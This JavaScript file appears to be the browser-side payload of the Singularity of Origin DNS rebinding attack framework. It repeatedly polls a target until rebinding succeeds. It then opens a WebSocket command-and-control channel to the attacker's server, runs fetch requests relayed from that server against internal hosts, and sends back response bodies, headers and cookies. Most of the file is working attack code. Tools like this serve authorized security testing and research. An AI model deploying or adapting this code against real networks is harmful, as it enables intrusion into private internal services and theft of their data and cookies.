// Wrap `fetch()` API, so we can invoke it:
// from the attack iframe (fetch attack method)
// or from the child iframe of the attack iframe (iframe attack method)
let sooFetch = function (resource, options) {
    return fetch(resource, options)
};

const Rebinder = () => {
    let headers = null;
    let cookie = null;
    let body = null;

    let url = null;
    let rebindingDoneFn = null;

    let timer = null;

    let payload = null;
    let interval = 60000;
    let wsproxyport = 3129;
    let rebindingSuccess = false;

    const rebindingStatusEl = document.getElementById('rebindingstatus');

    function initCommsWithParentFrame() {
        window.addEventListener('message', function (e) {
            console.log('attack frame', window.location.hostname, 'received message', e.data.cmd);

            switch (e.data.cmd) {
                case 'payload':
                    payload = e.data.param;
                    break;
                case 'interval':
                    interval = parseInt(e.data.param) * 1000;
                    break;
                case 'indextoken':
                    indextoken = e.data.param;
                    break;
                case 'wsproxyport':
                    wsproxyport = e.data.param;
                    break;
                case 'flushdns':
                    if (e.data.param.flushDns === true) {
                        console.log('Flushing Browser DNS cache.');
                        flushBrowserDnsCache(e.data.param.hostname);
                    }
                    break;
                case 'stop':
                    clearInterval(timer);
                    if (rebindingSuccess === false) {
                        rebindingStatusEl.innerText = `DNS rebinding failed!`;
                    }
                    break;
                case 'startFetch': // Fetch API attack method
                    console.log('payload.js: Fetch API attack method');
                    timer = setInterval(function () { run() }, interval);
                    console.log('frame', window.location.hostname, 'waiting', interval,
                        'milliseconds for dns update');
                    break;
                case 'startReloadChildFrame': // iframe attack method
                    console.log('payload.js: iframe attack method');
                    let f = document.createElement('iframe');
                    f.src = url
                    f.setAttribute('id', 'childFrame');
                    f.setAttribute('style', "display: none");
                    document.body.appendChild(f);
                    sooFetch = (resource, options) => {
                        const cw = document.getElementById('childFrame').contentWindow;
                        return cw.fetch(resource, options)
                    }
                    document.getElementById('childFrame').onload = onChildFrameLoad;
                    timer = setInterval(function () { document.getElementById('childFrame').src = `${window.origin}`; }, interval);           
            }
        });
    };

    // iframe method based on research from Daniel Thatcher
    // https://www.intruder.io/research/split-second-dns-rebinding-in-chrome-and-safari
    function onChildFrameLoad() {
        console.log('payload.js: onChildFrameLoad');
        let doc = document.getElementById('childFrame').contentDocument || document.getElementById('childFrame').contentWindow.document;
        let content = doc.body.innerText;

        if (content.indexOf("Singularity of Origin") !== 0) { 
            injectScript( document.getElementById('childFrame'));
            let p = sooFetch(url, {
                credentials: 'omit',
            });
            run(p);
        }
    }
    
    function injectScript(frame) {
        let doc = frame.contentDocument || frame.contentWindow.document;
        let script = document.createElement("script");
        script.setAttribute("type", "text/javascript");
        script.innerHTML = `${sooFetch.toString()};`;
        doc.body.append(script);
    }

    function init(myUrl, myRebindingDoneFn) {
        url = myUrl;
        rebindingDoneFn = myRebindingDoneFn;
        initCommsWithParentFrame();
        window.parent.postMessage({
            status: 'start'
        }, "*");
    };

    function run(prom) {
        let p = null;
        if (prom) {
            p = prom;
        } else {
            p = sooFetch(url, {
                credentials: 'omit',
            })
        }
            p.then(function (r) {

                let headerCount = 0;
                for (let pair of r.headers.entries()) {
                    headerCount += 1;
                };

                if (headerCount === 0) {
                    throw new Error('invalidHeaderCount');
                }

                if (r.headers.get('X-Singularity-Of-Origin') === 't') {
                    throw new Error('hasSingularityHeader');
                }

                headers = r.headers;
                cookie = document.cookie;

                return r.text();
            })
            .then(function (responseData) { // we successfully received the server response
                if (responseData.length === 0) {
                    // Browser is probably confused about abrupt connection drop. 
                    // Let's wait for the next iteration.
                    throw new Error('invalidResponseLength');
                }

                if (responseData.includes(indextoken)) {
                    throw new Error('hasToken');
                }

                body = responseData;
                clearInterval(timer); // stop the attack timer
                // Report success to parent frame
                window.parent.postMessage({
                    status: 'success',
                    response: body
                }, "*");
                // Terminate the attack
                rebindingSuccess = true;
                rebindingStatusEl.innerText = `DNS rebinding successful!`;
                rebindingDoneFn(payload, headers, cookie, body, wsproxyport);
            })
            .catch(function (error) {
                if (error instanceof TypeError) { // We cannot establish an HTTP connection
                    console.log('frame ' + window.location.hostname + ' could not load: ' + error);
                    window.parent.postMessage({
                        status: 'error',
                    }, "*");
                } else if (error.message === 'hasSingularityHeader' ||
                    error.message === 'invalidResponseLength' ||
                    error.message === 'hasToken' ||
                    error.message === 'invalidHeaderCount') {
                    console.log(`DNS rebinding did not happen yet: ${window.location.host}`)
                } else if (error.message == 'requiresHttpAuthentication') {
                    console.log('This resource requires HTTP Authentication.');
                    window.parent.postMessage({
                        status: 'requiresHttpAuthentication',
                    }, "*");
                    rebindingDoneFn(payload, headers, cookie, null);
                } else { // We did not handle something
                    console.log('Unhandled error: ' + error);
                    window.parent.postMessage({
                        status: 'error',
                    }, "*");
                }
            });
    };

    return {
        init,
        run,
    }
}

function timeout(ms, promise, controller) {
    return new Promise(function (resolve, reject) {
        setTimeout(function () {
            controller.abort();
            reject(new Error('timeout'))
        }, ms)
        promise.then(resolve, reject)
    })
}

function begin(url) {
    // s-hexstring1.hexstring2-session-method-e.attackerdomain
    const hostnameEl = document.getElementById('hostname');
    const arr = window.location.hostname.split('-');
    const sourceTarget = arr[1].split('.');
    const target = decodeIpHexString(sourceTarget[1]);
    const port = document.location.port ? document.location.port : '80';
    hostnameEl.innerText = `target: ${target}:${port}, session: ${arr[2]}, strategy: ${arr[3]}`;
    r = Rebinder();
    r.init(url, attack);
}

function wait(n) { return new Promise(resolve => setTimeout(resolve, n)); }


// Helper functions for Command and Control via websockets
function decodeIpHexString(hexString) {
    // Validate hexString length
    if (typeof hexString !== 'string') {
      throw new Error("Input must be a string");
    }

    const len = hexString.length;
    if (len !== 8 && len !== 32) {
      throw new Error(`Invalid hexstring length: ${len}. Must be 8 or 32.`);
    }

    if (!/^[0-9A-Fa-f]+$/.test(hexString)) {
      throw new Error("Hexstring contains invalid characters");
    }

    const bytes = new Uint8Array(len / 2);
    for (let i = 0; i < len; i += 2) {
      bytes[i / 2] = parseInt(hexString.slice(i, i + 2), 16);
    }

    if (bytes.length === 4) {
      return bytes.join('.');
    } else {
      return toIPv6String(bytes);
    }
  }

  function toIPv6String(bytes) {
    if (bytes.length !== 16) {
      throw new Error("toIPv6String requires a 16-byte Uint8Array");
    }

    // Break into 8 groups of 16 bits
    const groups = new Array(8);
    for (let i = 0; i < 8; i++) {
      groups[i] = ((bytes[i * 2] << 8) | (bytes[i * 2 + 1])).toString(16);
    }

    // Now we have an array of 8 hex strings, e.g. ["2a01", "7e00", "0", "0", "f03c", "91ff", "fe89", "2b5c"]
    // We need to find the longest run of zero groups and compress them into '::'

    // Find the longest run of consecutive "0" groups.
    let bestStart = -1;
    let bestLength = 0;

    let currentStart = -1;
    let currentLength = 0;

    for (let i = 0; i < 8; i++) {
      if (groups[i] === '0') {
        if (currentStart === -1) {
          currentStart = i;
          currentLength = 1;
        } else {
          currentLength++;
        }
      } else {
        if (currentStart !== -1) {
          // We ended a run of zeros
          if (currentLength > bestLength) {
            bestStart = currentStart;
            bestLength = currentLength;
          }
          currentStart = -1;
          currentLength = 0;
        }
      }
    }
    // Check if the last run ends at the end
    if (currentStart !== -1 && currentLength > bestLength) {
      bestStart = currentStart;
      bestLength = currentLength;
    }

    // If we found a run of at least two zeros, compress them
    if (bestLength > 1) {
      const replacement = "::";
      // groups[bestStart .. bestStart+bestLength-1] are "0"
      const compressed = [
        groups.slice(0, bestStart).join(":"),  // before zeros
        groups.slice(bestStart + bestLength).join(":")  // after zeros
      ].filter(Boolean).join(replacement);

      // If all groups were zero => "::"
      return compressed === "" ? "[::]" : `[${compressed}]`;
    } else {
      // No compressible run found => just join all groups
      return `[${groups.join(":")}]`;
    }
  }


// Request target to establish a websocket to Singularity server and wait for commands
// Implements retries to handle multiple answer strategy and firewall blocks.
function webSocketHook(headers, initialCookie, wsProxyPort, retry) {
    if (retry < 0) {
        console.log(`Abandoning websocket connection to Singularity after too many retries for: ${window.location.host}`);
        return;
    }

    const partOne = document.location.hostname.split('-')[1]
    const partTwo = partOne.split('.')[0]
    const serverIp = decodeIpHexString(partTwo)
    const wsurl = `${serverIp}:${wsProxyPort}`
    let httpAuth = false;

    // Did successful rebinding request required HTTP Auth?
    if (headers.get('www-authenticate') !== null) {
        httpAuth = true;
    };

    let ws = new WebSocket(`ws://${wsurl}/soows`);

    ws.onmessage = function (m) {
        const data = JSON.parse(m.data);

        // if our first rebinding request required HTTP Auth,
        // choose to not pass cookies between target and victim from now on,
        // as fetch() credential = 'include' will trigger a dialog box
        // if HTTP auth is required in target's browser
        // therefore informing target of ongoing attack.
        // Could be a problem if CSRF tokens are passed in cookies...
        if (httpAuth === true) {
            data.payload.fetchrequest.credentials = 'omit';
        }

        if (data.command === 'fetch') {
            if (data.payload.fetchrequest.method === 'GET' || data.payload.fetchrequest.message === 'HEAD') {
                delete data.payload.fetchrequest.body;
            } else {
                if (data.payload.fetchrequest.body !== null) {
                    data.payload.fetchrequest.body = atobUTF8(data.payload.fetchrequest.body)
                }
            }
            const messageID = data.payload.fetchrequest.id
            let fetchResponse = {
                "id": messageID,
                "command": "fetchResponse",
                "response": {},
                "body": "",
            }

            const fetch_retry = (url, options, n) => sooFetch(url, options)
                .then(function (r) {
                    fetchResponse.response.headers = r.headers;
                    fetchResponse.response.ok = r.ok;
                    fetchResponse.response.redirected = r.redirected;
                    fetchResponse.response.status = r.status;
                    fetchResponse.response.type = r.type;
                    fetchResponse.response.url = r.url;
                    fetchResponse.response.body = r.body;
                    fetchResponse.response.bodyUsed = r.bodyUsed;
                    fetchResponse.response.headers = {};
                    for (let pair of r.headers.entries()) {
                        fetchResponse.response.headers[pair[0]] = pair[1];
                    };
                    fetchResponse.response.cookies = getCookies();
                    return r.arrayBuffer()
                })
                .then(function (result) {
                    fetchResponse.body = base64ArrayBuffer(result);
                    ws.send(JSON.stringify(fetchResponse));
                }).catch(function (e) {
                    console.log(`Hook and command payload's fetch failed for frame ${window.location}: ${e}`);
                    if (n === 1) throw "Hook and command payload's fetch failed";
                    wait(1000).then(() => { return fetch_retry(url, options, n - 1); })
                });;

            fetch_retry(data.payload.url, data.payload.fetchrequest, 10);

        }

    }
    ws.onopen = function (evt) { }
    ws.onerror = function (e) {
        console.log(`WS error: ${e}`);
    }

    wait(1000)
        .then(() => {
            if (ws.readyState !== 1) {
                webSocketHook(headers, initialCookie, wsProxyPort, retry - 1);
            } else {
                console.log(`Successfully connected to Singularity via websockets for: ${window.location.host}`);
            }
        })
}

function buildCookie(val, days) {
    let expires = "";
    if (days) {
        let date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        expires = '; expires=' + date.toUTCString();
    }
    return `${val} ${expires} ; path=/`;
}

function getCookies() {
    return document.cookie === '' ? [] : document.cookie.split(';').map(x => x.trim());

}

function responseOKOrFail(errorString) {
    return function (r) {
        if (r.ok) {
            console.log('attack frame ', window.location.hostname, ' received a response');
            return r.text()
        } else {
            throw new Error(errorString)
        }
    }
}

// Converts an ArrayBuffer directly to base64, without any intermediate 'convert to string then
// use window.btoa' step. According to my tests, this appears to be a faster approach:
// http://jsperf.com/encoding-xhr-image-data/5

/*
MIT LICENSE
Copyright 2011 Jon Leighton
Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/


function base64ArrayBuffer(arrayBuffer) {
    var base64 = ''
    var encodings = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'

    var bytes = new Uint8Array(arrayBuffer)
    var byteLength = bytes.byteLength
    var byteRemainder = byteLength % 3
    var mainLength = byteLength - byteRemainder

    var a, b, c, d
    var chunk

    // Main loop deals with bytes in chunks of 3
    for (var i = 0; i < mainLength; i = i + 3) {
        // Combine the three bytes into a single integer
        chunk = (bytes[i] << 16) | (bytes[i + 1] << 8) | bytes[i + 2]

        // Use bitmasks to extract 6-bit segments from the triplet
        a = (chunk & 16515072) >> 18 // 16515072 = (2^6 - 1) << 18
        b = (chunk & 258048) >> 12 // 258048   = (2^6 - 1) << 12
        c = (chunk & 4032) >> 6 // 4032     = (2^6 - 1) << 6
        d = chunk & 63 // 63       = 2^6 - 1

        // Convert the raw binary segments to the appropriate ASCII encoding
        base64 += encodings[a] + encodings[b] + encodings[c] + encodings[d]
    }

    // Deal with the remaining bytes and padding
    if (byteRemainder == 1) {
        chunk = bytes[mainLength]

        a = (chunk & 252) >> 2 // 252 = (2^6 - 1) << 2

        // Set the 4 least significant bits to zero
        b = (chunk & 3) << 4 // 3   = 2^2 - 1

        base64 += encodings[a] + encodings[b] + '=='
    } else if (byteRemainder == 2) {
        chunk = (bytes[mainLength] << 8) | bytes[mainLength + 1]

        a = (chunk & 64512) >> 10 // 64512 = (2^6 - 1) << 10
        b = (chunk & 1008) >> 4 // 1008  = (2^6 - 1) << 4

        // Set the 2 least significant bits to zero
        c = (chunk & 15) << 2 // 15    = 2^4 - 1

        base64 += encodings[a] + encodings[b] + encodings[c] + '='
    }

    return base64
}

//https://github.com/anonyco/BestBase64EncoderDecoder

(function (window) {
    "use strict";
    var log = Math.log;
    var LN2 = Math.LN2;
    var clz32 = Math.clz32 || function (x) {
        return 31 - log(x >>> 0) / LN2 | 0
    };
    var fromCharCode = String.fromCharCode;
    var originalAtob = atob;
    var originalBtoa = btoa;

    function btoaReplacer(nonAsciiChars) {
        // make the UTF string into a binary UTF-8 encoded string
        var point = nonAsciiChars.charCodeAt(0);
        if (point >= 0xD800 && point <= 0xDBFF) {
            var nextcode = nonAsciiChars.charCodeAt(1);
            if (nextcode !== nextcode) // NaN because string is 1 code point long
                return fromCharCode(0xef /*11101111*/, 0xbf /*10111111*/, 0xbd /*10111101*/);
            // https://mathiasbynens.be/notes/javascript-encoding#surrogate-formulae
            if (nextcode >= 0xDC00 && nextcode <= 0xDFFF) {
                point = (point - 0xD800) * 0x400 + nextcode - 0xDC00 + 0x10000;
                if (point > 0xffff)
                    return fromCharCode(
                        (0x1e /*0b11110*/ << 3) | (point >>> 18),
                        (0x2 /*0b10*/ << 6) | ((point >>> 12) & 0x3f /*0b00111111*/),
                        (0x2 /*0b10*/ << 6) | ((point >>> 6) & 0x3f /*0b00111111*/),
                        (0x2 /*0b10*/ << 6) | (point & 0x3f /*0b00111111*/)
                    );
            } else return fromCharCode(0xef, 0xbf, 0xbd);
        }
        if (point <= 0x007f) return inputString;
        else if (point <= 0x07ff) {
            return fromCharCode((0x6 << 5) | (point >>> 6), (0x2 << 6) | (point & 0x3f));
        } else return fromCharCode(
            (0xe /*0b1110*/ << 4) | (point >>> 12),
            (0x2 /*0b10*/ << 6) | ((point >>> 6) & 0x3f /*0b00111111*/),
            (0x2 /*0b10*/ << 6) | (point & 0x3f /*0b00111111*/)
        );
    }
    window["btoaUTF8"] = function (inputString, BOMit) {
        return originalBtoa((BOMit ? "\xEF\xBB\xBF" : "") + inputString.replace(
            /[\x80-\uD7ff\uDC00-\uFFFF]|[\uD800-\uDBFF][\uDC00-\uDFFF]?/g, btoaReplacer
        ));
    }
    //////////////////////////////////////////////////////////////////////////////////////
    function atobReplacer(encoded) {
        var codePoint = encoded.charCodeAt(0) << 24;
        var leadingOnes = clz32(~codePoint);
        var endPos = 0,
            stringLen = encoded.length;
        var result = "";
        if (leadingOnes < 5 && stringLen >= leadingOnes) {
            codePoint = (codePoint << leadingOnes) >>> (24 + leadingOnes);
            for (endPos = 1; endPos < leadingOnes; ++endPos)
                codePoint = (codePoint << 6) | (encoded.charCodeAt(endPos) & 0x3f /*0b00111111*/);
            if (codePoint <= 0xFFFF) { // BMP code point
                result += fromCharCode(codePoint);
            } else if (codePoint <= 0x10FFFF) {
                // https://mathiasbynens.be/notes/javascript-encoding#surrogate-formulae
                codePoint -= 0x10000;
                result += fromCharCode(
                    (codePoint >> 10) + 0xD800, // highSurrogate
                    (codePoint & 0x3ff) + 0xDC00 // lowSurrogate
                );
            } else endPos = 0; // to fill it in with INVALIDs
        }
        for (; endPos < stringLen; ++endPos) result += "\ufffd"; // replacement character
        return result;
    }
    window["atobUTF8"] = function (inputString, keepBOM) {
        if (!keepBOM && inputString.substring(0, 3) === "\xEF\xBB\xBF")
            inputString = inputString.substring(3); // eradicate UTF-8 BOM
        // 0xc0 => 0b11000000; 0xff => 0b11111111; 0xc0-0xff => 0b11xxxxxx
        // 0x80 => 0b10000000; 0xbf => 0b10111111; 0x80-0xbf => 0b10xxxxxx
        return originalAtob(inputString).replace(/[\xc0-\xff][\x80-\xbf]*/g, atobReplacer);
    };
})(typeof global == "" + void 0 ? typeof self == "" + void 0 ? this : self : global);

function flushBrowserDnsCache(hostname) {
    let worker = new Worker('flushdnscache.js');
    let params = {};
    params.hostname = hostname;
    params.port = document.location.port;
    params.iterations = 1000;
    worker.postMessage(params);
}

function httpHeaderstoText(headers) {
    out = "";
    for (let pair of headers.entries()) {
        out = (`${out}\n${pair[0]}: ${pair[1]}`);
    };
    return out;
}

let Registry = {};
